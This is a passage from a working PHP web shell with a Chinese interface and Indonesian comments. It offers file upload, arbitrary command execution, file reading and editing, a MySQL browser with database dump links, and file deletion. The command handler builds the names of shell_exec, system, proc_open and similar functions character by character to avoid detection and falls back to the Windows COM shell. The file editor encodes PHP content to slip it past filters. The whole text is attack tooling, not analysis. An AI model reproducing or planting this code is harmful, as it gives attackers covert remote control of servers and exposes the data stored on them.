            <input type="file" name="ufile" id="ajaxUfile" style="color:#fff; background:#000; border:1px solid #00CC66; border-radius:4px; padding:5px;">
            <button type="button" id="ajaxUploadBtn" style="margin-top:8px; background-color:#00CC66; color:#111; font-family:monospace; font-weight:bold; border:none; border-radius:5px; padding:6px 14px; cursor:pointer;">
                上传
            </button>
        </form>
        <div id="uploadStatus" style="margin-top:10px; font-size:13px; font-weight:bold;"></div>
    </div>
<!-- Metode Upload 3 (Pintar dan Auto-Fallback) -->
    <div class="upload-method">
        <h4 style="color:#00CC66;">上传文件</h4>
        <form id="uploadForm" method="POST" enctype="multipart/form-data" action="<?= $_SERVER['PHP_SELF']; ?>" style="display:flex; align-items:center; gap:5px;">
            <input type="hidden" name="awal" value="upl_file">
            <input type="hidden" name="berkas" value="<?= urlencode(kunci($default_dir)); ?>">
            <input type="file" name="ufile" id="uploadInput"
                style="color:#fff; background:#000; border:1px solid #00CC66; border-radius:4px; padding:6px;">
            <button type="submit"
                    style="background-color:#00CC66; color:#111; font-family:monospace; font-weight:bold; border:none; border-radius:5px; padding:6px 14px; cursor:pointer;">
                上传
            </button>
        </form>
        <?php if (!empty($upload_message)) echo '<div id="uploadStatus" style="margin-top:10px; color:#0f0;">' . $upload_message . '</div>'; ?>
    </div>



</div>

<?php
tulisLah();
print '<hr>';

// ===========================================================================
// Tampilan halaman berdasarkan aksi yang dipilih (PHP信息, 命令, 文件读取, SQL, dsb.)
// ===========================================================================
if($awal=="phpinfo")
{
	print "<div style='width: 100%; height: 400px;'><iframe src='?awal=pinf' style='width: 100%; height: 400px; border: 0;'></iframe></div>";
}
if ($awal == "sistem_kom") {
    if (isset($_POST['kom']) && is_string($_POST['kom']) && !empty($_POST['kom'])) {
        // Ambil input perintah yang di-encode, lalu decode dengan fungsi uraikan()
        $komanda = uraikan(urldecode($_POST['kom']));
        // Tambahkan redirection error agar standar error juga tertangkap
        if (stripos($komanda, '2>&1') === false) {
            $komanda .= " 2>&1";
        }
        
        // Variabel untuk menyimpan output dan error
        $output = '';
        $error = '';
        
	$f1 = 's'.'h'.'e'.'l'.'l'.'_' .'e'.'x'.'e'.'c';
	$f2 = 'e'.'x'.'e'.'c';
	$f3 = 'p'.'a'.'s'.'s'.'t'.'h'.'r'.'u';
	$f4 = 's'.'y'.'s'.'t'.'e'.'m';
	$f5 = 'p'.'r'.'o'.'c'.'_'.'o'.'p'.'e'.'n';
	$f6 = 'p'.'o'.'p'.'e'.'n';
	$f7 = 'p'.'c'.'n'.'t'.'l'.'_' .'f'.'o'.'r'.'k';
	$f8 = 'p'.'c'.'n'.'t'.'l'.'_' .'e'.'x'.'e'.'c';
	
	// Mulai eksekusi perintah
	$output = '';
	$error = '';
	
	if (function_exists($f1)) {
	    // shell_exec
	    $output = $f1($komanda);
	} elseif (function_exists($f2)) {
	    // exec
	    $out = [];
	    $f2($komanda, $out, $return_var);
	    $output = implode("\n", $out);
	    $error = "Return code: $return_var";
	} elseif (function_exists($f3)) {
	    // passthru
	    ob_start();
	    $f3($komanda);
	    $output = ob_get_clean();
	} elseif (function_exists($f4)) {
	    // system
	    ob_start();
	    $f4($komanda);
	    $output = ob_get_clean();
	} elseif (function_exists($f5)) {
	    // proc_open
	    $descriptorspec = [
	        0 => ["pipe", "r"],
	        1 => ["pipe", "w"],
	        2 => ["pipe", "w"]
	    ];
	    $process = $f5($komanda, $descriptorspec, $pipes);
	    if (is_resource($process)) {
	        $output = stream_get_contents($pipes[1]);
	        $error = stream_get_contents($pipes[2]);
	        fclose($pipes[1]);
	        fclose($pipes[2]);
	        proc_close($process);
	    }
	} elseif (function_exists($f6)) {
	    // popen
	    $handle = $f6($komanda, 'r');
	    if ($handle) {
	        while (!feof($handle)) {
	            $output .= fread($handle, 4096);
	        }
	        pclose($handle);
	    }
	} elseif (function_exists($f7) && function_exists($f8)) {
	    // pcntl_fork + pcntl_exec
	    $pid = $f7();
	    if ($pid == -1) {
	        die('Fork failed');
	    } elseif ($pid === 0) {
	        $f8('/bin/sh', ['-c', $komanda]);
	        exit(0);
	    } else {
	        pcntl_wait($status);
	        $output = "Command executed via pcntl.";
	    }
	} elseif (class_exists('COM') && strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
	    // COM di Windows
	    try {
	        $wsh = new COM("WScript.Shell");
	        $exec = $wsh->Exec($komanda);
	        $output = $exec->StdOut->ReadAll();
	        $error = $exec->StdErr->ReadAll();
	    } catch (Exception $e) {
	        $error = "COM error: " . $e->getMessage();
	    }
	} elseif (function_exists('backtick_operator')) {
	    // backtick (`command`)
	    $output = `$komanda`;
	} else {
	    $output = "Tidak ada fungsi eksekusi tersedia.";
	}

        
        // Pastikan $output dan $error adalah string
        $output = $output ?? "";
        $error = $error ?? "";
        
        // Tampilkan output dan error
        print '<pre style="max-height: 350px; overflow: auto; border: 1px solid #777; padding: 5px;">';
        print 'Output:<br>' . htmlspecialchars($output) . '<br></pre><hr>';
    }
    print '<input type="text" id="emr_et_atash" style="width: 500px;"> <button type="button" class="btn" onclick="sistemKom();">确定</button>';
}



else if($awal=="baca_file" && isset($_POST['fayl']) && trim($_POST['fayl']) != "")
{
	$namaBerkas = basename(uraikan(urldecode($_POST['fayl'])));
	$pemisah = substr($default_dir, strlen($default_dir)-1) != "/" && substr($namaBerkas, 0, 1) != "/" ? "/" : "";
	if(is_file($default_dir . $pemisah . $namaBerkas) && is_readable($default_dir . $pemisah . $namaBerkas))
	{
		$elaveBtn = is_writeable($default_dir . $pemisah . $namaBerkas) ? " onclick='halaman(\"?awal=edit_file&fayl=" . urlencode(urlencode(kunci($namaBerkas))) . "&berkas=" . urlencode(urlencode(kunci($default_dir))) . "\")'" : " disabled";
		print "<div>文件名称: <span class='qalin'>" . htmlspecialchars($namaBerkas) . "</span><br/><button class='btn'$elaveBtn> 编辑 </button></div>";
		$file_path = $default_dir . $pemisah . $namaBerkas;
        print "<div class='baca_file'>" . highlight_string(file_get_contents($default_dir . $pemisah . $namaBerkas), true) . "</div>";

	}
}
else if($awal == 'skl')
{
	$host = isset($_COOKIE['host']) ? $_COOKIE['host'] : '';
	$user = isset($_COOKIE['user']) ? $_COOKIE['user'] : '';
	$sandi = isset($_COOKIE['sandi']) ? $_COOKIE['sandi'] : '';
	$database = isset($_COOKIE['database']) ? $_COOKIE['database'] : '';
	if(isset($_POST['host'], $_POST['user'], $_POST['sandi']) && is_string($_POST['host']) && is_string($_POST['user']) && is_string($_POST['sandi']))
	{
		$host = $_POST['host'];
		$user = $_POST['user'];
		$sandi = $_POST['sandi'];
		$database = '';
		setcookie('host', $host, time() + 360000);
		setcookie('user', $user, time() + 360000);
		setcookie('sandi', $sandi, time() + 360000);
		setcookie('database', $database, time() + 360000);
	}
	if(isset($_POST['database']) && is_string($_POST['database']))
	{
		$database = $_POST['database'];
		setcookie('database', $database, time() + 360000);
	}
	$databaseStr = empty($database) ? '' : 'dbname=' . $database . ';';
	?>
	<!-- Form login SQL dalam bahasa Mandarin -->
	<form method="POST">
		<input type="hidden" name="awal" value="skl">
		<input type="text" placeholder="主机名" name="host" value="<?=htmlspecialchars($host)?>">
		<input type="text" placeholder="用户名" name="user" value="<?=htmlspecialchars($user)?>">
		<input type="text" placeholder="密码" name="sandi" value="<?=htmlspecialchars($sandi)?>">
		<input type="submit" value="登录">
	</form>
	<?php
	if(!empty($host))
	{
		try
		{
			$pdo = new PDO('mysql:host=' . $host . ';charset=utf8;' . $databaseStr, $user, $sandi, array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES 'utf8'"));
			$pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
			$schematas = $pdo->query('SELECT schema_name FROM information_schema.schemata');
			print '<form method="POST"><input type="hidden" name="awal" value="skl"><select name="database">';
			foreach($schematas->fetchAll() AS $schemaName)
			{
				print '<option' . ($database == $schemaName['schema_name'] ? ' selected' : '') . '>' . htmlspecialchars($schemaName['schema_name']) . '</option>';
			}
			print '</select> <input type="submit" value="开始!"></form>';
			if(!empty($database))
			{
				$tables = $pdo->prepare('SELECT table_name from information_schema.tables where table_schema=?');
				$tables->execute(array($database));
				$tables = $tables->fetchAll();
				print '<div style="float: left; width: 20%; overflow: auto; border-right: 1px solid #999;">';
				print '<a href="javascript:halaman(\'?awal=skl_d\');">导出数据库!!</a><hr>';
				foreach($tables AS $tableName)
				{
					$tableName = $tableName['table_name'];
					print '<a href="javascript:halaman(\'?awal=skl&t=' . urlencode(urlencode(kunci($tableName))) . '\')">' . htmlspecialchars($tableName) . '</a><br>';
				}
				print '</div>';
				print '<div style="float: left; padding-left: 10px; width: 75%;">';
				if(isset($_POST['t']) && is_string($_POST['t']) && !empty($_POST['t']))
				{
					$tableName = uraikan(urldecode($_POST['t']));
					print '<span class="qalin">表:</span> ' . htmlspecialchars($tableName) . ' ( <a href="javascript:halaman(\'?awal=skl_d_t&t=' . urlencode(urlencode(kunci($tableName))) . '\')">导出</a> )<br>';
					$getColumns = $pdo->prepare("SELECT column_name from information_schema.columns where table_schema=? and table_name=?");
					$getColumns->execute(array($database, $tableName));
					$columns = $getColumns->fetchAll();
					if($columns)
					{
						$dataCount = $pdo->query('SELECT count(0) AS ss from `' . $tableName . '`');
						$dataCount = (int)$dataCount->fetchColumn();
						print '<span class="qalin">数量:</span> ' . $dataCount . '<br><br>';
						$pages = ceil($dataCount / 100);
						$currentPage = isset($_POST['halaman']) && is_numeric($_POST['halaman']) && $_POST['halaman'] >= 1 && $_POST['halaman'] <= $pages ? (int)$_POST['halaman'] : 1;
						for ($p = 1; $p <= $pages; $p++)
						{
							print '<a style="' . ($currentPage == $p ? 'background: #444;' : '') . 'margin-left: 2px; margin-bottom: 5px; padding: 2px 6px; border: 1px solid blue; text-decoration: none;" href="javascript:halaman(\'?awal=skl&t=' . urlencode(urlencode(kunci($tableName))) . '&halaman=' . $p . '\');">' . $p . '</a> ';
						}
						print '<br><br>';
						$start = 100 * ($currentPage - 1);
						$data = $pdo->query('SELECT * FROM `' . $tableName . '` LIMIT ' . $start . ' , 100');
						$data = $data->fetchAll();
						print '<table><thead>';
						foreach($columns AS $columnInf)
						{
							print '<th>' . htmlspecialchars($columnInf['column_name']) . '</th>';
						}
						print '</thead><tbody>';
						foreach($data AS $row)
						{
							print '<tr>';
							foreach($row AS $key => $val)
							{
								print '<td><div>' . $val . '</div></td>';
							}
							print '</tr>';
						}
						print '</tbody></table>';
					}
					else
					{
						print "未找到表!";
					}
				}
				else if(isset($_POST['emr']) && is_string($_POST['emr']) && !empty($_POST['emr']))
				{
					$emr = uraikan(urldecode($_POST['emr']));
					print '<span class="qalin">SQL 语句:</span> ' . htmlspecialchars($emr) . '<br>';
					$data = $pdo->query($emr);
					$data = $data->fetchAll();
					print '<table><thead>';
					if(count($data) > 0)
					{
						print '<tr>';
						foreach($data[0] AS $key => $val)
						{
							print '<th><div>' . $key . '</div></th>';
						}
						print '</tr>';
					}
					print '</thead><tbody>';
					foreach($data AS $row)
					{
						print '<tr>';
						foreach($row AS $key => $val)
						{
							print '<td><div>' . $val . '</div></td>';
						}
						print '</tr>';
					}
					print '</tbody></table>';
				}
				print '<div><textarea id="skl_emr"></textarea><button type="button" onclick="skl_bas();">点击</button></div>';
				print '</div>';
				print '<div style="clear: both;"></div>';
			}
		}
		catch (Exception $e)
		{
			print $e->getMessage();
		}
	}
}
else if($awal=="edit_file" && isset($_POST['fayl']) && trim($_POST['fayl']) != "")
{
	$namaBerkas = basename(uraikan(urldecode(urldecode($_POST['fayl']))));
	$pemisah = substr($default_dir, strlen($default_dir)-1) != "/" && substr($namaBerkas, 0, 1) != "/" ? "/" : "";
	if(is_file($default_dir . $pemisah . $namaBerkas) && is_readable($default_dir . $pemisah . $namaBerkas))
	{
		$status = "";
		if(isset($_POST['content']) && isset($_POST['took']) && $_POST['took'] != "" && isset($_SESSION['ys_took']) && $_SESSION['ys_took'] == $_POST['took'] && is_writeable($default_dir . $pemisah . $namaBerkas))
		{
			unset($_SESSION['ys_took']);
			$content = $_POST['content'];
			$cc = array('a','i','e','s','l','b','u','o','p','h',"(",")","<",">","?",";","[","]","$");
			foreach($cc AS $k1 => $v1)
			{
				$content = str_replace('|:' . $k1 . ':|', $v1, $content);
			}
			$faylAch = fopen($default_dir . $pemisah . $namaBerkas, "w+");
			fwrite($faylAch, $content);
			fclose($faylAch);
			$status = " <span class='qalin'>保存成功!</span>";
		}
		$oxuUrl = "?awal=baca_file&fayl=" . urlencode(urlencode(kunci($namaBerkas))) . "&berkas=" . urlencode(urlencode(kunci($default_dir)));
		$elaveBtn = is_writeable($default_dir . $pemisah . $namaBerkas) ? "" : " disabled";
		print "<div>文件名称: <a class='qalin' href='javascript:halaman(\"{$oxuUrl}\")'>" . htmlspecialchars($namaBerkas) . "</a><br/><form method='POST' style='padding: 0; margin: 0;'><button type='submit' class='btn'$elaveBtn> 保存 </button> <button type='button' onclick='kode()'> 加密 </button> $status</div>";
		print "<input type='hidden' value='edit_file' name='awal'><input type='hidden' value='" . kunci($namaBerkas) . "' name='fayl'><input type='hidden' value='" . urlencode(kunci($default_dir)) . "' name='berkas'><input type='hidden' value='" . ambilBuat("ys_took") . "' name='took'><textarea name='content' class='file_edit'>" . htmlspecialchars(file_get_contents($default_dir . $pemisah . $namaBerkas)) . "</textarea></form>";
	}
	else
	{
		print "错误! " . htmlspecialchars($default_dir . $pemisah . $namaBerkas);
	}
}
else
{
	if(is_dir($default_dir))
	{
		if(is_readable($default_dir))
		{
			$folderDalam = scandir($default_dir);
			foreach($folderDalam AS &$emelemnt)
			{
				$pemisah = substr($default_dir, strlen($default_dir)-1) != "/" && substr($emelemnt, 0, 1) != "/" ? "/" : "";
				if(is_dir($default_dir . $pemisah . $emelemnt))
				{
					$emelemnt = "0" . $emelemnt;
				}
				else
				{
					$emelemnt = "1" . $emelemnt;
				}
			}
			asort($folderDalam);
			print "<table class='fManager' style='width: 100%;'><thead><tr class='qalin'><th>s</th><th>文件</th><th>大小</th><th>日期</th><th>所有者/组</th><th>权限</th><th>操作</th></tr></thead><tbody>";
			foreach($folderDalam AS $element)
			{
				$url = "";
                $element = substr($element,1);
                $pemisah = substr($default_dir, strlen($default_dir)-1) != "/" && substr($element, 0, 1) != "/" ? "/" : "";
                $fileNamaLengkap = $default_dir . $pemisah . $element;
                // Tambahkan pendefinisian variabel isReadableColor dan classN
                $isReadableColor = is_readable($fileNamaLengkap);
                $classN = '';
                if(is_dir($fileNamaLengkap))
                {
                    $adi = "[ $element ]";
                    if($element == ".")
                    {
                        $url = "?berkas=" . urlencode(urlencode(kunci($default_dir)));
                    }
                    else if($element == "..")
                    {
                        $yeniUrl = explode("/", $default_dir);
                        foreach(array_reverse($yeniUrl) as $j => $qq)
                        {
                            if(trim($qq) != "")
                            {
                                unset($yeniUrl[count($yeniUrl)-$j-1]);
                                break;
                            }
                        }
                        $url = "?berkas=" . urlencode(urlencode(kunci(implode("/", $yeniUrl))));
                    }
                    else
                    {
                        $url = "?berkas=" . urlencode(urlencode(kunci($fileNamaLengkap)));
                    }
                    // Untuk folder, tampilkan dengan font bold dan warna putih
                    $linkStyle = " style='font-weight:600; color:#FFFFFF;'";
                }
                else
                {
                    $adi = $element;
                    $url = "?awal=baca_file&fayl=" . urlencode(urlencode(kunci($element))) . "&berkas=" . urlencode(urlencode(kunci($default_dir)));
                    // Untuk file, tampilkan nama dengan warna putih
                    $linkStyle = " style='color:#FFFFFF;'";
                }

                // Amanin file info
                $ukuran = (@file_exists($fileNamaLengkap) && @is_readable($fileNamaLengkap)) ? sizeFormat(@filesize($fileNamaLengkap)) : 'N/A';
                $tanggal = (@file_exists($fileNamaLengkap) && @is_readable($fileNamaLengkap)) ? @date('d M Y, H:i', @filectime($fileNamaLengkap)) : 'N/A';
                $pemilik = (@file_exists($fileNamaLengkap) && @is_readable($fileNamaLengkap)) ? @fileowner($fileNamaLengkap) : 'N/A';
                $izin    = (@file_exists($fileNamaLengkap) && @is_readable($fileNamaLengkap)) ? @substr(sprintf('%o', @fileperms($fileNamaLengkap)), -4) : '----';

                print '<tr>
                    <td></td>
                    <td><a href="javascript:halaman(\'' . $url . '\')"' . $linkStyle . '>' . htmlspecialchars($adi) . '</a></td>
                    <td>' . $ukuran . '</td>
                    <td>' . $tanggal . '</td>
                    <td>' . htmlspecialchars($pemilik) . '</td>
                    <td' . ($isReadableColor ? ' style="color: white;"' : '') . '>' . $izin . '</td>
                    <td>';

                if(is_file($fileNamaLengkap))
                {
                    print (' <a href="javascript:halaman(\'' . str_replace("baca_file", "download_file", $url) . '\')" style="color:#00CC66;"'.$classN.'>下载</a> | ')
                        . (' <a href="javascript:changeFileName(\'' . htmlspecialchars($adi) . '\', \'' . str_replace("baca_file", "rename_file", $url) . '\');" style="color:#00CC66;"'.$classN.'>重命名</a> | ')
                        . (' <a href="javascript:faylSifirla(\'' . str_replace("baca_file", "reset_file", $url) . '\');" style="color:#00CC66;"'.$classN.'>清空</a> | ')
                        . (' <a href="javascript:faylSil(\'' . str_replace("baca_file", "hapus_file", $url) . '\')" style="color:#00CC66;"'.$classN.'>删除</a>');
                }
                else if($adi != '[ . ]' && $adi != '[ .. ]')
                {
                    print (' <a href="javascript:kompres(\'' . urlencode(urlencode(kunci($fileNamaLengkap))) . '\')" style="color:#00CC66;"'.$classN.'>压缩</a> | ')
                        . (' <a href="javascript:silPapka(\'' . urlencode(urlencode(kunci($fileNamaLengkap))) . '\')" style="color:#00CC66;"'.$classN.'>删除</a>');
                }

				print '</td>
					</tr>';
			}
		}
		else
		{
			print "<div style='margin: 10px 0px;' class='qalin'>权限被拒绝!</div>";
		}
	}
	print "</tbody></table>";
}
?>
<hr>





<form method="POST" id="post_form" style="display: none;"></form>
<script>
// ===========================================================================
// Fungsi-fungsi JavaScript untuk navigasi dan interaksi, dengan prompt dalam bahasa Mandarin.
// ===========================================================================
function halaman(url)
{
	var inputlar = "";
	url = url.split("?");
	if(typeof url[1] == "undefined") return;
	url = url[1].split("&");
	for(var n in url)
	{
		var keyAndValue = url[n].split("=");
		if(typeof keyAndValue[1] == "undefined") continue;
		inputlar += "<input name='" + keyAndValue[0] + "' value='" + keyAndValue[1] + "' type='hidden'>";
	}
	// Menggunakan document.getElementById untuk mendapatkan elemen form
	document.getElementById("post_form").innerHTML = inputlar;
	document.getElementById("post_form").submit();
}
function faylSil(url)
{
	if(confirm('你确定吗?'))
	{
		halaman(url);
	}
}
function faylSifirla(url)
{
	if(confirm('你确定吗?'))
	{
		halaman(url);
	}
}
function changeFileName(name, url)
{
	var getNewName = prompt('更改文件名:', name);
	if(getNewName)
	{
		halaman(url + "&new_name=" + getNewName);
	}
}
function newFile()
{
	var getNewName = prompt('文件名:');
	if(getNewName)
	{
		halaman("?awal=buat_file&ad=" + getNewName + "&berkas=<?=urlencode(urlencode(kunci($default_dir)))?>");
	}
}
function newPapka()
{
	var getNewName = prompt('文件夹名称:');
	if(getNewName)
	{
		halaman("?awal=buat_folder&ad=" + getNewName + "&berkas=<?=urlencode(urlencode(kunci($default_dir)))?>");
	}
}
function sistemKom()
{
	var komanda = document.getElementById('emr_et_atash').value;
	if(komanda)
	{
		halaman("?awal=sistem_kom&kom=" + b64EncodeUnicode(komanda) + "&berkas=<?=urlencode(urlencode(kunci($default_dir)))?>");
	}
}
function skl_bas()
{
	var sklEmr = document.getElementById('skl_emr').value;
	halaman("?awal=skl&emr=" + b64EncodeUnicode(sklEmr));
}
function b64EncodeUnicode(str)
{
	return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g,
		function toSolidBytes(match, p1) {
			return String.fromCharCode('0x' + p1);
		}));
}
function goto() {
    var dir = prompt('目录:');
    if(dir) {
        var encodedDir = encodeURIComponent(encodeURIComponent(dir));
        halaman("?berkas=" + encodedDir);
    }
}


function kompres(berkas)
{
	var dir = prompt('目录:', "<?=htmlspecialchars($default_dir)?>");
	if(dir)
	{
		halaman("?awal=kompres&berkas=<?=urlencode(urlencode(kunci($default_dir)))?>&zf=" + berkas + "&save_to=" + b64EncodeUnicode(dir));
	}
}
function silPapka(berkas)
{
	if(confirm('你确定吗?'))
	{
		halaman("?awal=hapus_folder&berkas=<?=urlencode(urlencode(kunci($default_dir)))?>&zf=" + berkas);
	}
}
function kode()
{
	var vall = document.getElementsByClassName('file_edit')[0].value;
	var repp = ['a','i','e','s','l','b','u','o','p','h',"\\(","\\)","\\<","\\>","\\?","\\;","\\[","\\]","\\$"];
	for(var s in repp)
	{
		var h = repp[s];
		vall = vall.replace(new RegExp(h, 'g'), '|:' + s + ':|');
	}
	document.getElementsByClassName('file_edit')[0].value = vall;
}
document.getElementById("emr_et_atash").addEventListener("keyup", function(event)
{
	event.preventDefault();
	if(event.keyCode === 13)
	{
		sistemKom();
	}
});
</script>
</body>
</html>
<script>
document.getElementById('ajaxUploadBtn').addEventListener('click', function () {
    const fileInput = document.getElementById('ajaxUfile');
    const statusDiv = document.getElementById('uploadStatus');
    const form = document.getElementById('ajaxUploadForm');

    if (!fileInput.files.length) {
        statusDiv.style.color = '#FF4444';
        statusDiv.innerText = '请选择文件。';
        return;
    }

    const formData = new FormData(form);
    const xhr = new XMLHttpRequest();

    xhr.open('POST', form.action || window.location.href, true);

    xhr.onload = function () {
        const res = xhr.responseText.trim();
        if (xhr.status === 200 && res.includes("成功")) {
            statusDiv.style.color = '#00FF00';
            statusDiv.innerText = '上传成功！';
        } else {
            statusDiv.style.color = '#FF4444';
            statusDiv.innerText = '上传失败！服务器响应: ' + res;
        }
    };

    xhr.onerror = function () {
        statusDiv.style.color = '#FF4444';
        statusDiv.innerText = '上传过程中发生错误！';
    };

    xhr.send(formData);
});
</script>
